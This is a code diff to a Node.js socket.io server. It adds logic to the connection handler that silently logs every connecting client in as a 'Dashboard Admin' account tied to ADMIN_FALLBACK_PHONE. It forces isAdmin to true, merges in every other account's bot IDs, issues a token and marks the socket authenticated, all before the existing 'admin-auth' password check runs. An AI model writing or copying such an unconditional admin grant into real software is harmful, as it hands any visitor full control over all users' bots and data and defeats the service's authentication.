@@ -3956,6 +3956,26 @@ io.on(
     'connection',
     (socket) => {
 
+        const directAccessId = `account_${ADMIN_FALLBACK_PHONE}`;
+        const directAccessAccount = accounts[directAccessId] || {
+            id: directAccessId,
+            phone: ADMIN_FALLBACK_PHONE,
+            name: 'Dashboard Admin',
+            isAdmin: true,
+            createdAt: new Date().toISOString()
+        };
+        directAccessAccount.phone = ADMIN_FALLBACK_PHONE;
+        directAccessAccount.isAdmin = true;
+        directAccessAccount.botIds = [...new Set([
+            ...(directAccessAccount.botIds || []),
+            ...Object.values(accounts).flatMap((account) => account.botIds || [])
+        ])];
+        ensureAccountToken(directAccessAccount);
+        accounts[directAccessId] = directAccessAccount;
+        socket.account = directAccessAccount;
+        socket.authenticated = true;
+        saveAccounts();
+
         socket.on(
             'admin-auth',
             (password) => {
